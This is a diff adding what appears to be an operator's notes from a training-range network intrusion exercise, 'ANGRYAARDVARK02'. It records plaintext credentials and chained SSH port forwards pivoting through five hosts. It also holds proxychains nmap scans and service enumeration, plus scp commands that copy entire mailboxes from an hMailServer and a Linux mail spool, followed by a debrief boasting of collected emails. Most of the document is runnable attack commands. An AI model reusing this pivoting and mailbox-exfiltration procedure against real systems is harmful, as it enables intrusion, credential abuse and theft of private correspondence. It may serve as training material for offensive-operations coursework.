@@ -1,0 +1,171 @@
+
+
+
+Scheme of Maneuver:
+>T1: 10.50.29.166
+->T2: 10.20.169.122
+-->T3: 10.20.169.238
+--->T4: ADMIN1
+---->T5: Suspected mail server?
+---->T6: Suspected mail server?
+
+engineer#::enshallah // caisson#::tread_depth // NOC_Admin#::5gftE8DCc8 // user#::P455w0rd
+
+Secure Copy (scp) is the preferred method for file transfers <10MB.
+
+T1: 10.50.29.166
+Hostname: EXT_RTR
+IP: 10.50.29.166
+OS: Linux v. unknown
+Creds: engineer#::enshallah
+Last Known SSH Port: 10123
+
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer4@10.50.29.166 -p 10123
+enshallah
+
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T2:
+Hostname: STORAGE1
+IP: 10.20.169.122
+OS: Windows v. unknown
+Creds: caisson#::tread_depth
+Last Known SSH Port: 52203
+ssh -S /tmp/T1 bad -O forward -L 2222:10.20.169.122:52203
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson4@localhost
+tread_depth
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T3:
+Hostname: Vyos1
+IP: 10.20.169.238 / 192.168.169.206
+OS: Vyos
+Creds: NOC_Admin#::5gftE8DCc8
+Last Known SSH Port: 52230
+ssh -S /tmp/T2 bad -O forward -L 3333:10.20.169.238:52230
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin4@localhost
+5gftE8DCc8
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T4:
+Hostname: ADMIN1
+IP: 192.168.169.43 
+OS: CentOS 7
+Creds: user#::P455w0rd
+@@Last Known SSH Port: 33521
+Host: 192.168.169.43 () Ports: 33125/open/tcp/////, 33215/open/tcp/////, 33251/open/tcp/////, 33521/open/tcp///// 
+ssh -S /tmp/T3 bad -O forward -L 4444:192.168.169.43:33521
+ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user4@localhost
+P455w0rd
+
+
+Action: Test credentials via SSH masquerade. If successful, perform a @@device survey. @@@Collect any files of interest. Conduct network discovery to locate any mail servers in the ADMIN1’s internal network. Network discovery will at a minimum consist of scanning to determine all potential target IP’s, OS’s, and SSH Ports.  SSH ports for the potential target devices in this network are usually in the 33000-33999 range. Redirect to any additional targets of interest.
+
+SURVEY
+SEARCH
+COLLECTION CHECK FILE SIZE
+COLLECT on TERMSCREEN SCP
+
+for i in {1..50}; do sudo ping -c 1 -W 1 10.123.169.$i; done | grep 'bytes from'
+ssh -S /tmp/T4 bad -O forward -D 9050
+proxychains nmap -Pn -sT 10.123.169.1,2,3,5,30,35 -p33000-33999 -T4 --oG proxychains_nmap | grep open
+
+proxychains nc 10.123.169.30 33502
+proxychains nc 10.123.169.35 33502
+
+
+
+T5:  >>Suspected mail server<<
+Hostname: Unknown
+IP: 10.123.169.30
+OS: Windows
+Creds: Unknown
+Last Known SSH Port: 33502
+ssh -S /tmp/T4 bad -O forward -L 5555:10.123.169.30:33502
+ssh -MS /tmp/T5 -p 5555 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user4@localhost
+P455w0rd
+###let MC and EA know the IP OS and port and cred####
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, @@perform a device survey. Locate email accounts and @@@collect all emails contained therein. Maneuver to the next target, if applicable.
+ssh -S /tmp/T5 bad 'wmic service list full' >> Survey_10.123.169.30
+SURVEY
+SEARCH
+COLLECTION CHECK FILE SIZE (check with MC)
+COLLECT on TERMSCREEN SCP
+
+dir /o:d /t:w "C:\Program Files (x86)\hMailServer\Data\Workgroup\Air Defense"
+143,406 bytes
+
+dir /o:d /t:w "C:\Program Files (x86)\hMailServer\Data\Workgroup\Armored Cavalry"
+137,764 bytes
+
+dir /o:d /t:w "C:\Program Files (x86)\hMailServer\Data\Workgroup\Command Elements"
+140,362 bytes
+
+dir /o:d /t:w "C:\Program Files (x86)\hMailServer\Data\Workgroup\Cyber-Comms Detachment"
+140,362 bytes
+
+dir /o:d /t:w "C:\Program Files (x86)\hMailServer\Data\Workgroup\Ground Forces"
+138,178 bytes
+
+dir /o:d /t:w "C:\Program Files (x86)\hMailServer\Data\Workgroup\R&D"
+135,618 bytes
+
+dir /o:d /t:w "C:\Program Files (x86)\hMailServer\Data\Workgroup\Supply"
+142,542 bytes
+
+
+scp -o ControlPath=/tmp/T5 -P 5555 -r 'student4@localhost:"C:/Program Files (x86)/hMailServer/Data/Workgroup/"' ~/Downloads/an_16-08-22_ANGRYAARDVARK02/T5 
+
+dir /o:d /t:w "C:\Program Files (x86)\hMailServer\Temp"
+dir C:\ /s /b | findstr /s *.eml *.edb *.emlx" *.isc *.mbox *.msg *.oft *.oml *.ost *.pst *.rpmsg 
+dir C:\ /s /b | findstr /e ".edb"
+dir C:\ /s /b | findstr /e ".emlx"
+dir C:\ /s /b | findstr /e ".edb"
+
+####DISCONNECT T5###### before T6
+
+T6:  >>Suspected mail server<<
+Hostname: Unknown
+IP: 10.123.169.35
+OS: Linux
+Creds: Unknown
+Last Known SSH Port: 33502
+ssh -S /tmp/T4 bad -O forward -L 6666:10.123.169.35:33502
+ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user4@localhost
+P455w0rd
+###let MC and EA know the IP OS and port and cred####
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, @@perform a device survey. Locate email accounts and @@@collect all emails contained therein. Conclude operation.
+
+SURVEY
+SEARCH
+COLLECTION CHECK FILE SIZE (check with MC)
+COLLECT on TERMSCREEN SCP
+
+scp -o ControlPath=/tmp/T6 -P 6666 -r 'user4@localhost:"/var/spool/mail/Air Defense/"' ~/Downloads/an_16-08-22_ANGRYAARDVARK02/T6
+scp -o ControlPath=/tmp/T6 -P 6666 -r 'user4@localhost:"/var/spool/mail/Command Elements/"' ~/Downloads/an_16-08-22_ANGRYAARDVARK02/T6
+
+scp -o ControlPath=/tmp/T6 -P 6666 -r 'user4@localhost:"/var/spool/mail/Cyber-Comms Detachment/"' ~/Downloads/an_16-08-22_ANGRYAARDVARK02/T6
+
+scp -o ControlPath=/tmp/T6 -P 6666 -r 'user4@localhost:"/var/spool/mail/R&D/"' ~/Downloads/an_16-08-22_ANGRYAARDVARK02/T6
+scp -o ControlPath=/tmp/T6 -P 6666 -r 'user4@localhost:"/var/spool/mail/Supply/"' ~/Downloads/an_16-08-22_ANGRYAARDVARK02/T6
+scp -o ControlPath=/tmp/T6 -P 6666 -r 'user4@localhost:"/var/spool/mail/Armored Cavalry/"' ~/Downloads/an_16-08-22_ANGRYAARDVARK02/T6
+scp -o ControlPath=/tmp/T6 -P 6666 -r 'user4@localhost:"/var/spool/mail/Ground Forces/"' ~/Downloads/an_16-08-22_ANGRYAARDVARK02/T6
+
+
+
+
+DEBRIEF 
+
+Operator: 1LT An
+Operation: ANGRYAARDVARK02
+
+MC: mc2
+
+Analyst: analyst2
+
+Description: ANGRYAARDVARK is a C-ISR mission profile. On T1, we redirected to T2. On T2, we redirected to T3. On T3, we redirected to T4. On T4 we performed survey and scanned for T5 and T6. From T4, we moved to T5 and also conducted a survey and collected over 350 email files from 7 different email accounts. From T4, we also moved to T6 and conducted a survey and collected email files from 7 different email accounts. Overall, we were successful in collecting all necessary files from the targets. 
+For collection, we found that T5 was running a hmailserver. It had seven users in the Workgroup folder where we located all the emails for that user. On T6, it was running IMAP server and we were able to locate all the emails in the /var/spool/mail where we collected all the emails within. 
+Overall, we were able to enumerate new IP addresses for the FUOP and collected important emails that may used for mission planning in the future.  
